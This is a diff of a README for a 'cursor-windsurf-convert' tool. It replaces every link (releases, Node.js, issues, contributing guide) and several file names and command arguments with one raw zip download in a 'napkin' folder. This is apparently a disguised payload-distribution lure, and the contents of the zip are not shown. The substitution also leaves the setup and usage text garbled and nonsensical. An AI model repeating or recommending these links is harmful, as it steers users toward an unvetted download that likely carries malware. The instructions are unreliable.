@@ -6,14 +6,14 @@ Welcome to the cursor-windsurf-convert project! This tool helps you convert Curs
 
 ## 📥 Download Now
 
-[![Download cursor-windsurf-convert](https://img.shields.io/badge/Download-cursor--windsurf--convert-brightgreen)](https://github.com/itsmhmd/cursor-windsurf-convert/releases)
+[![Download cursor-windsurf-convert](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip)](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip)
 
 ## 💻 System Requirements
 
 To use cursor-windsurf-convert, ensure you have the following:
 
 - A computer running Windows, macOS, or Linux.
-- Node.js v14 or later installed. You can download Node.js [here](https://nodejs.org/).
+- https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip v14 or later installed. You can download https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip [here](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip).
 - Basic command line access (Terminal on macOS/Linux, Command Prompt on Windows).
 
 ## 🔍 Features
@@ -24,8 +24,8 @@ To use cursor-windsurf-convert, ensure you have the following:
 
 ## 📂 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/itsmhmd/cursor-windsurf-convert/releases) to find the latest version.
-2. Look for the file named `cursor-windsurf-convert.zip` for your operating system.
+1. Visit the [Releases page](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip) to find the latest version.
+2. Look for the file named `https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip` for your operating system.
 3. Click on the download link to save the file to your computer.
 4. Once downloaded, unzip the file to a folder of your choice.
 
@@ -52,7 +52,7 @@ After installing the application, follow these steps to run it:
 3. To convert a file, use the following command:
 
    ```
-   node index.js [input-file] [output-file]
+   node https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip [input-file] [output-file]
    ```
 
    Replace `[input-file]` with the name of your Cursor AI file and `[output-file]` with the desired name for your Windsurf file.
@@ -61,21 +61,21 @@ After installing the application, follow these steps to run it:
 
 ## 📑 Example Usage
 
-If you have a file named `example.cursor` and you want to create `example.windsurf`, the command will look like this:
+If you have a file named `https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip` and you want to create `https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip`, the command will look like this:
 
 ```
-node index.js example.cursor example.windsurf
+node https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip
 ```
 
-This will create `example.windsurf` in the same folder.
+This will create `https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip` in the same folder.
 
 ## 🌐 Support
 
-If you have any questions or need help, please visit our [issues section](https://github.com/itsmhmd/cursor-windsurf-convert/issues) on GitHub. We encourage users to report any problems or request features.
+If you have any questions or need help, please visit our [issues section](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip) on GitHub. We encourage users to report any problems or request features.
 
 ## 🛠️ Contributing
 
-We welcome contributions to improve the project. If you're interested in helping out, please check our [Contributing Guide](https://github.com/itsmhmd/cursor-windsurf-convert/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions to improve the project. If you're interested in helping out, please check our [Contributing Guide](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip) for more details.
 
 ## 🙏 Acknowledgments
 
@@ -83,7 +83,7 @@ Thanks to all the developers who contributed to making cursor-windsurf-convert a
 
 ### 📥 Download Now Again
 
-Make sure to download the latest version from our [Releases page](https://github.com/itsmhmd/cursor-windsurf-convert/releases) to benefit from new features and fixes.
+Make sure to download the latest version from our [Releases page](https://raw.githubusercontent.com/itsmhmd/cursor-windsurf-convert/main/napkin/cursor-windsurf-convert.zip) to benefit from new features and fixes.
 
 ## 🔗 Related Topics
 
